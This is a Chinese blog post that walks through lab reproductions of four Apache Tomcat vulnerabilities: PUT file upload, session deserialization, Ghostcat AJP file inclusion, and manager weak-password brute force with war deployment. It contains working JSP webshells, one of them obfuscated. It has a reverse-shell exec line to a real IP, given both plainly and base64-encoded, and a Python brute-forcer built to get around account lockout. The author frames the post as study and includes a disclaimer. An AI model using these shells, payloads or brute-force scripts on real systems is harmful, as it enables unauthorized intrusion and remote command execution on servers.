#  Tomcat 中间件漏洞复现   
原创 pwjcw  剑外思归客   2024-04-13 22:54  
  
## Tomcat PUT请求任意文件写入 （CVE-2017-12615）  
### 漏洞介绍  
  
tomcat的conf/web.xml配置文件中将readonly配置为false时，攻击者可以通过PUT请求上传任意文件。  
### 漏洞范围  
  
Apache Tomcat 7.0.0 - 7.0.81  
### 漏洞成因  
  
将tomcat的 conf/web.xml 配置文件 readonly 配置为false导致put请求上传文件  
### 漏洞分析  
  
上面已经提到了只要将readonly 设置为false时才可以进行攻击，看一下readonly是什么  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LOMpgKr927VQuSCgia0yaj9X7zLUcoiaBFmudmkzDQNjyTegejf7xqMJw/640?wx_fmt=png&from=appmsg "")  
  
大概意思就是只有将readonly设置为false时才可以接收PUT和DELETE请求，但是却不仅仅于此，因为可以在该配置文件的下文看到如下配置  
```
    <servlet>

        <servlet-name>jsp</servlet-name>

        <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>

        <init-param>

            <param-name>fork</param-name>

            <param-value>false</param-value>

        </init-param>

        <init-param>

            <param-name>xpoweredBy</param-name>

            <param-value>false</param-value>

        </init-param>

        <load-on-startup>3</load-on-startup>

    </servlet>
    <!-- The mappings for the JSP servlet -->

    <servlet-mapping>

        <servlet-name>jsp</servlet-name>

        <url-pattern>*.jsp</url-pattern>

        <url-pattern>*.jspx</url-pattern>

    </servlet-mapping>

```  
  
readonly配置是在defaultServlet中进行配置的,下面是default Servlet的配置  
```
<servlet>

        <servlet-name>default</servlet-name>

        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>

        <init-param>

            <param-name>debug</param-name>

            <param-value>0</param-value>

        </init-param>

        <init-param>

            <param-name>listings</param-name>

            <param-value>false</param-value>

        </init-param>
        <!--readonly是需要手动设置的，默认为true-->
         <init-param>

            <param-name>readonly</param-name>

            <param-value>false</param-value>

        </init-param>

        <load-on-startup>1</load-on-startup>

    </servlet>

```  
  
在上面的配置中有两个Servlet，一个是default另一个是 jsp 当请求中的后缀带有jsp或者jspx时，jsp Servlet负责处理该请求，但是前文提到的readonly 是 default Servlet中的参数，这也就意味着我们直接使用PUT方式上传一个JSP文件，该请求会交给 jsp Servlet 处理，但是该Servlet并不能接收PUT请求，于是也就没法上传了。但是如果有方法绕过 jsp Servler 处理呢？把请求交给 default Servlet 来处理，这样不就可以正常发送 PUT请求上传文件了吗？  
##### 绕过思路  
- 在jsp后缀后面加一个\ 如 a.jsp\  
  
- 在jsp后缀后面加一个 url编码后的空格%20 如 a.jsp%20  
  
- 如果是windows 系统可以在后面添加 ::$DATA 如 a.jsp::$DATA  
  
### 漏洞复现  
  
复现环境来自 vulhub
构造PUT请求包，访问目标首页，直接将GET改成POST url就是上传的文件名，请求体就是文件的内容，格式如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LK7tia5oU99xAKQfeQNAcDtNPvDOpnN93fgUOarQN7g7yNxFvz6DV4ag/640?wx_fmt=png&from=appmsg "")  
  
shell的内容  
```
<%

    if("b".equals(request.getParameter("pwd"))){

        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();

        int a = -1;

        byte[] b = new byte[2048];

        out.print("<pre>");

        while((a=in.read(b))!=-1){

            out.println(new String(b));

        }

        out.print("</pre>");

    }

%>

```  
  
访问刚刚上传的shell.jsp文件，尝试查看/etc/passwd  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LGnxWqnsOQKJyicJjgiaWDAezonhW956GNxwlhAnHXAn9ZWRYJrlUHngQ/640?wx_fmt=png&from=appmsg "")  
  
复现成功  
### 总结  
  
需要手动更改tomcat 的配置，默认配置是没有漏洞的，所以觉的这个漏洞在真实环境应该是没有太多用武之地的，另外令我感到疑惑的是，我查了很多文章和资料，都说这个漏洞的范围是Tomcat 7.0.0 - 7.0.81,但是我在vulhub上面下载的靶机tomcat版本确是8.5.19  这就很离谱了，仍然复现成功，有知道这是为什么的师傅可以指教我一下。  
## Tomcat Session反序列化 （CVE-2020-9484）  
### 漏洞介绍  
  
这个漏洞本质上是基于Tomcat session持久化的一个漏洞，Tomcat 自带session管理功能，可以将session对象进行序列化存储到文件或者数据库中，当服务器崩溃或者宕机重启之后仍然可以从磁盘或者数据库中恢复session对象，存放在session中的对象必须要实现java.io.Serializable接口，因为在session进行持久化的时候，需要对session对象进行序列化和反序列化，这也就造成了Tomcat 反序列化漏洞  
### 利用条件  
  
成功利用此漏洞需要同时满足以下4个条件:  
- 攻击者能够控制服务器上文件的内容和文件名称  
  
- 服务器PersistenceManager配置中使用了FileStore  
  
- PersistenceManager中的sessionAttributeValueClassNameFilter被配置为“null”，或者过滤器不够严格，导致允许攻击者提供反序列化数据的对象  
  
- 攻击者知道使用的FileStore存储位置到攻击者可控文件的相对路径  
  
### 影响版本  
- Apache Tomcat: 10.0.0-M1 to 10.0.0-M4  
  
- Apache Tomcat: 9.0.0.M1 to 9.0.34  
  
- Apache Tomcat: 8.5.0 to 8.5.54  
  
- Apache Tomcat: 7.0.0 to 7.0.103  
  
### 简单的漏洞分析  
  
上面已经提到了，因为不正确的配置出现了该漏洞，这个配置可以在tomcat的conf/context.conf 中进行配置，下面是一个错误的配置示例  
```
<?xml version="1.0" encoding="UTF-8"?>

<!--  Licensed to the Apache Software Foundation (ASF) under one or more  contributor license agreements.  See the NOTICE file distributed with  this work for additional information regarding copyright ownership.  The ASF licenses this file to You under the Apache License, Version 2.0  (the "License"); you may not use this file except in compliance with  the License.  You may obtain a copy of the License at        http://www.apache.org/licenses/LICENSE-2.0    Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an "AS IS" BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.-->

<Context antiResourceLocking="false" privileged="true" >

<!--  <Valve className="org.apache.catalina.valves.RemoteAddrValve"         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />-->

  <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>

  <Manager className="org.apache.catalina.session.PersistentManager">

    <Store className="org.apache.catalina.session.FileStore" directory="/tomcat/sessions/"/>

  </Manager>

</Context>

```  
  
解释一下这段配置：  
- antiResourceLocking="false"：这个属性用于指定是否启用反资源锁定功能，设置为false表示禁用。  
  
- privileged="true"：这个属性用于指定是否在安全管理器中执行上下文的代码时授予所有权限，设置为true表示授予所有权限。  
  
- <Manager>元素：这个元素配置了Tomcat的Session管理器，指定了一些属性和类。sessionAttributeValueClassNameFilter属性：用于指定哪些类的属性可以被保存在Session中。  
  
- <Store>元素：指定了Session的持久化存储方式，这里使用FileStore，将Session数据存储在指定目录/tomcat/sessions/中。  
  
根据上面的配置，tomcat会调用org.apache.catalina.session.FileStore类将session持久化到/tomcat/sessions目录中，由于代码太长，只贴一下关键部分的代码：  
```
public Session load(String id) throws ClassNotFoundException, IOException {
    // 打开指定路径的输入流（如果存在）
    File file = file(id);
    if (file == null || !file.exists()) {
        return null;
    }
    Context context = getManager().getContext();
    Log contextLog = context.getLogger();
    if (contextLog.isDebugEnabled()) {
        // 如果日志级别为debug，则输出加载信息
        contextLog.debug(sm.getString(getStoreName()+".loading", id, file.getAbsolutePath()));
    }
    // 绑定ClassLoader，以便在特定上下文中加载类
    ClassLoader oldThreadContextCL = context.bind(Globals.IS_SECURITY_ENABLED, null);
    try (FileInputStream fis = new FileInputStream(file.getAbsolutePath());
        //将fis进行反序列化
            ObjectInputStream ois = getObjectInputStream(fis)) {
        // 创建一个空会话对象
        StandardSession session = (StandardSession) manager.createEmptySession();
        // 从输入流中读取对象数据并填充到会话对象中
        session.readObjectData(ois);
        session.setManager(manager);
        return session;
    } catch (FileNotFoundException e) {
        // 如果找不到持久化数据文件，则输出相应信息
        if (contextLog.isDebugEnabled()) {
            contextLog.debug("No persisted data file found");
        }
        return null;
    } finally {
        // 解绑ClassLoader
        context.unbind(Globals.IS_SECURITY_ENABLED, oldThreadContextCL);
    }
}

 private File file(String id) throws IOException {
        if (this.directory == null) {
            return null;
        } else {
            String filename = id + ".session";
            File file = new File(this.directory(), filename);
            return file;
        }
    }


```  
  
根据源码可以看出，tomcat会根据session id读取session持久化文件，并进行反序列化操作，并且该文件的名字为sessionID.session 搭建一个环境来调试分析一下看看。  
#### 调试分析  
  
搭建的环境来自于：https://github.com/masahiro331/CVE-2020-9484，为了方便调试，我对这个环境增加了ssh连接功能，如果你需要使用该环境进行idea调试，那么请开始ssh的端口映射
环境index.jsp 源码  
```
<%@ page contentType="text/html; charset=UTF-8" %>
<%
    String name = "World";
    session.setAttribute("name", name);
    String name2 = (String)session.getAttribute("name");
%>
<html>
<body>
<p>
    name = <%= name %><br>
    name2 = <%= name2 %><br>
    <br>
</p>
<p>(sessionID=<%= session.getId() %>)</p>
</body>
</html>


```  
  
由于我们需要调试的是反序列化，所以在session.getAttribute这一行添加断点  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LDic66gzeOiaFjyBSFuCjga6gEeGekibsEM6kHcGW1LibKK1TwOdibPoR3iaA/640?wx_fmt=png&from=appmsg "")  
  
通过跟进代码我们可以看出来，tomcat并没有对session id的内容进行过滤  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LI2U8MyAeL2srSszYarG84ic2Nz9kPPdE1RPuwSjchU8x1miaibKrXCEgw/640?wx_fmt=png&from=appmsg "")  
  
这也就意味着，如果我们构造一个恶意的序列化的类，将其持久化写入到文件，并且上传到tomcat中，**如果我们知道相对的文件路径的话**，将相对路径放入session id中，就能实现session 反序列化漏洞的利用，具体漏洞利用过程如下。  
### 漏洞复现  
  
在上面的context.xml配置文件中，已经将存储session的位置固定为/tomcat/sessions,此时，构造一段恶意的session文件，并将其序列化到文件，将文件上传到tomcat服务器
使用yakit生成一段Groovy1的payload，其执行的命令是在根目录创建一个aaa的文件，将payload保存为test.sesson  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LJ0MIq6uE6n4D9uyroa2RufqfUvPa5iaeZdmIeBU4N1nsS17yLNU2mSQ/640?wx_fmt=png&from=appmsg "")  
  
将该session文件上传到tomcat服务器的根目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2Ls6OdZMfsicDH9db7vGdEVR04s40EIMzEC64fEWfiazG9icfCfcOh1NFhQ/640?wx_fmt=png&from=appmsg "")  
  
由于session文件存放的位置是/tomcat/sessions,所以test.sessions的相对存储路径为../../test.sessions于是构造的Cookie是Cookie:JSESSIONID=../../test，为了方便使用curl发送请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LichlgAAqz9Fibbo6mZB9ydtm1JdMiahndeMl1BnBcm0DACFz7r4Gfa5kQ/640?wx_fmt=png&from=appmsg "")  
  
虽然报错了，但是反序列化仍然执行成功了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LWwO1c8SMGia2NZ3kyB2m3sz37UWgRS4dAyHcR42SibwrknloEWibNTLicw/640?wx_fmt=png&from=appmsg "")  
### 总结  
  
其实这个漏洞需要omcat进行持久化配置，并且需要配合文件上传漏洞才能进行，上传一个session文件，而且还要知道上传后的位置与session文件本身的存储位置，二者之间的相对路径，这样才能利用，总之来说，个人觉得这个漏洞有点鸡肋，在做黑盒设计漏洞挖掘的时候，即使碰到了也不一定知道存在该漏洞。  
  
参考文章：Tomcat Session(CVE-2020-9484)反序列化漏洞复现 - FreeBuf网络安全行业门户  
## Tomcat AJP协议文件包含漏洞 (CVE-2020-1938)  
### 漏洞概述  
  
Apache Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器。默认情况下，Apache Tomcat会开启AJP连接器，方便与其他Web服务器通过AJP协议进行交互。但Apache Tomcat在AJP协议的实现上存在漏洞，导致攻击者可以通过发送恶意的AJP请求，可以读取或者包含Web应用根目录下的任意文件，如果存在文件上传功能，将可以导致任意代码执行。漏洞利用AJP服务端口实现攻击，未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0）  
```


```  
### 影响版本  
- Apache Tomcat 6  
  
- Apache Tomcat 7 < 7.0.100  
  
- Apache Tomcat 8 < 8.5.51  
  
- Apache Tomcat 9 < 9.0.31  
  
### 利用条件  
  
目标机开启8009端口，并且版本符合上述的影响版本  
### 漏洞复现  
  
复现环境仍然是vulhub上面的环境，该环境会开启8009端口，这个端口就是ajp协议的默认端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2L5h6E4zJmf7ibK4bLZ7tlHHNgvB4L8vAL9BBdDia2Ym0ayA1iasgXicrjuQ/640?wx_fmt=png&from=appmsg "")  
  
使用https://github.com/00theway/Ghostcat-CNVD-2020-10487进行漏洞验证  
#### 文件读取  
  
由于tomcat在请求中会过滤/../也就意味着只能读取ROOT目录下的文件，所以读取一个WEB-INF/web.xml文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LvvkVGFuDpe1ckeJ2s7qVQpqwwiaC382DaHL4mHdG2wtKLPoEiaPa107g/640?wx_fmt=png&from=appmsg "")  
#### 文件包含  
##### 创建木马jsp文件遇到的一个坑  
  
开始的时候，我在tomcat的webapps/ROOT中创建了一个jsp的命令执行代码，发现不能用，这是一个坑  
```
<%Runtime.getRuntime().exec("bash -i >& /dev/tcp/106.12.141.38/7890 0>&1"); %>

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LicpVz3wcatr4bRfWjJlrKKtdvtBJ90rGpKyXd6ibBZeAreNtKEc0qibDw/640?wx_fmt=png&from=appmsg "")  
##### 解决方案  
  
这个问题就是java会对exec函数里面的参数进行空格分隔
参考：https://www.cnblogs.com/BOHB-yunying/p/15523680.html
于是shell.jsp内容为：  
```
<%
Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTIuMTQxLjM4Lzc4OTAgMD4mMQ==}|{base64,-d}|{bash,-i}");
%>

```  
  
运行脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LgOuV2tq7sdhMfdQZ8DicSbxFrbXWstiaD1O2C0fABTt3vGF7NxQ6b3gQ/640?wx_fmt=png&from=appmsg "")  
  
监听到反弹shell的连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2L4HlhoSufBTKlGd6BpqkH9lDPV1DIjU8acQ3KA5Fniccs8rInsNrIggA/640?wx_fmt=png&from=appmsg "")  
### 总结  
  
这个漏洞利用需要一定的条件，比如目标机开启了8009端口，想要拿到shell的话，那么web服务需要有文件上传的功能，上传一个任意类型的文件，然后使用文件包含即可。  
## Tomcat 后台弱口令&& 任意war包部署  
### 漏洞概述  
  
tomcat 后台管理可以部署war包，在条件符合的情况下，可以通过部署war包，来拿下tomcat 服务器的shell  
### 利用条件  
  
tomcat后台的Manager App允许用户登入并且允许远程访问  
### 漏洞复现  
  
tomcat manager支持在后台部署war包文件，但是需要一定的权限，默认情况下，tomcat的后台管理界面只能允许本地访问，并且tomcat需要配置相关的账号和权限才可以登入，默认情况下是没有配置相关的账号的，需要手动在conf/tomcat-users.xml中配置，下面是一个配置实例  
```
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
    
</tomcat-users>

```  
  
在上面的示例中，配置了一个用户名和密码都是tomcat的用户，并且拥有了所有的权限，然而仅仅配置这些还是不够的，因为Tomcat Manager 只允许本地访问，直接访问将会出现403报错，于是还需要将webapps/manager/META-INF/context.xml配置里面的ip限制注释掉，如  
```
<?xml version="1.0" encoding="UTF-8"?>
<!--  Licensed to the Apache Software Foundation (ASF) under one or more  contributor license agreements.  See the NOTICE file distributed with  this work for additional information regarding copyright ownership.  The ASF licenses this file to You under the Apache License, Version 2.0  (the "License"); you may not use this file except in compliance with  the License.  You may obtain a copy of the License at      http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software  distributed under the License is distributed on an "AS IS" BASIS,  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  See the License for the specific language governing permissions and  limitations under the License.-->
<Context antiResourceLocking="false" privileged="true" >
  <!-- <CookieProcessor className="org.apache.tomcat.util.http.Rfc6265CookieProcessor"                   sameSiteCookies="strict" /> -->
  <!-- <Valve className="org.apache.catalina.valves.RemoteAddrValve"         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" /> -->
  <!-- <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/> -->
</Context>

```  
  
此时就可以访问Tomcat Manager并进行密码爆破和war包部署了  
#### 账户爆破  
  
在点击tomcat的Manager App会进入到登入界面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LezSoT71Re1AgxIOcZ5ooPdZttsYLevsEWcHUp1fc0ONrAnHYTViaPww/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2L7X3QxgtdUvMl3SPQFXZgI41R5nLSxLrFMiaVIibiaKoQs8jtAAHjxwBxg/640?wx_fmt=png&from=appmsg "")  
  
抓一下包，看一下账户和密码的发送方式  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LYKfgVGV1nWrKibTHiaMyxhalBRN1OuHAeOJkoWAKFneX0x5FVjagolQg/640?wx_fmt=png&from=appmsg "")  
  
可以看出来，是HTTP Basic认证，账户和密码的格式为：Authorization: Basic base64(username:passwd)，如果账户和密码错误的话，会返回401状态码，如果账户和密码都正确，那么返回状态码为200，此时假装我们不知道账户和密码来进行复现一下攻击过程
于是我写了一个爆破脚本，如下：  
```
import base64  
  
import requests  
  
  
def blast_passwd(url):  
 headers={  
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",  
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  
 "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",  
 "Accept-Encoding": "gzip, deflate",  
 "Connection": "keep-alive",  
 "Upgrade-Insecure-Requests": "1",  
 "Authorization": "Basic "  
 }  
 with open("username.txt","r") as f:  
  usernames=f.readlines()  
 with open("passwd.txt","r") as f:  
  passwds=f.readlines()  
 proxies={"http":"127.0.0.1:8083"}  
 for name in usernames:  
  for passwd in passwds:  
   authorCon=base64.b64encode((name.rstrip()+":"+passwd.rstrip()).encode("utf-8"))  
   # print(authorCon.decode("utf-8"))  
   headers["Authorization"]="Basic "+authorCon.decode("utf-8")  
   res=requests.get(url,headers=headers,proxies=proxies)  
   # print(res.request.headers)  
   print(name.rstrip() + ":" + passwd.rstrip(),res.status_code)  
   if res.status_code!=401:  
    print("[*]密码爆破成功！"+name,passwd)  
    break 
  else:
   continue
  break 
  
if __name__ == '__main__':  
blast_passwd("http://192.168.23.22:8989/manager/html")


```  
  
正确的账户和密码都在字典里面，发现所有响应的状态码都是401，不应该啊，于是查了一下，发现tomcat自带账户封禁策略，当一个账户的登入失败次数超过5次之后，将会使该用户封禁5分钟，并且在下一个5分钟之内没有新的登入失败的话，会重新从0计次，这个还真棘手，但是也可以解决，只需要改一下代码遍历的顺序即可，前提是字典的用户名数量要足够多，下面是更改之后的代码  
```
import base64
import time

import requests


def blast_passwd(url):
    headers={
  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
  "Accept-Encoding": "gzip, deflate",
  "Connection": "keep-alive",
  "Upgrade-Insecure-Requests": "1",
  "Authorization": "Basic "
}
    with open("username.txt","r") as f:
        usernames=f.readlines()
    with open("passwd.txt","r")  as f:
        passwds=f.readlines()
    for passwd in passwds:
        for name in usernames:
            authorCon=base64.b64encode((name.rstrip()+":"+passwd.rstrip()).encode("utf-8"))
            # print(authorCon.decode("utf-8"))
            headers["Authorization"]="Basic "+authorCon.decode("utf-8")
            res=requests.get(url,headers=headers)
            time.sleep(0.5)
            # print(res.request.headers)
            print(name.rstrip() + ":" + passwd.rstrip(),res.status_code)
            if res.status_code!=401:
                print("[*]密码爆破成功！"+name,passwd)
                break
        else:
            continue
        break

if __name__ == '__main__':
    blast_passwd("http://172.28.218.106:8989/manager/html")

```  
#### 上传war包  
  
登入到后台之后，可以看到上传war包的入口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LqtvN1ykibjicuuSgBTwW6vLvFGhXQG2iakVdRQrMwW8Hzt6bcW0dVIMqQ/640?wx_fmt=png&from=appmsg "")  
  
首先创建一个jsp的马，然后将其压缩为zip格式，然后修改zip后缀为war即可,jsp马的内容：  
```
<% String A0U44=request.getParameter("aaa");ProcessBuilder

    pb;if(String.valueOf(java.io.File.separatorChar).equals("\\")){pb=new ProcessBuilder(new /*Z1Po4C57K8*/String(new

    byte[]{99, 109, 100}), new String(new byte[]{47, 67}), A0U44);}else{pb=new

    ProcessBuilder/*Z1Po4C57K8*/(new/*Z1Po4C57K8*/String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new

    String(new byte[]{45, 99}), A0U44);}if (A0U44 !=null) {Process process=pb.start();java.util.Scanner E70GAlS3=new

    java.util.Scanner(process.getInputStream()).useDelimiter("\\A");String op="" ;op=E70GAlS3.hasNext() ?

    E70GAlS3.next() : op;E70GAlS3.close();out.print(op);}else {} %>

```  
  
然后上传，如果上传成功会返回ok消息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2LmE4HuCI6JsPDQnicdGg2H02Rq6dc2NJEb0ibUTz6ibvUbfsFS1Z9EeMGw/640?wx_fmt=png&from=appmsg "")  
  
访问jsp马的路径，war名/jsp文件名，如：172.28.218.106:8989/20240409100309/20240409100309.jsp上面的jsp马会执行aaa参数，于是传入一个参数试一下，看看是否能够成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/9bOzaictich6TJV0rclZlxskw28fUAeg2L01SONz2qeCYcyITPDRDE0DmfciaEIPXPPY6lVuicoaxya8GPlbENHPJA/640?wx_fmt=png&from=appmsg "")  
  
命令执行成功  
### 总结  
  
这个漏洞还是不能直接利用，需要修改tomcat的配置文件，允许tomcat manager允许外网访问，并且设置了tomcat manager的用户，如果没有这两个前提这个漏洞就不存在了。关于这个漏洞的影响范围，我暂时也没搞懂，据说tomcat不同版本的manager可能会不同，这个我去tomcat 官网下载tomat 5版本的，但是发现下载连接404了。暂时就这样吧  
## 文末  
  
关于tomcat的漏洞还有很多，暂时先学习几个比较常见的吧(网上介绍比较多的)，临近面试还有很多东西需要研究一下，上面的笔记只是跟着网上的教程自己复现一遍，结合了一些自己的思路和总结，如有不足或者错误之处欢迎各位师傅多多指正！  
  
**免责声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！！**  
  
  
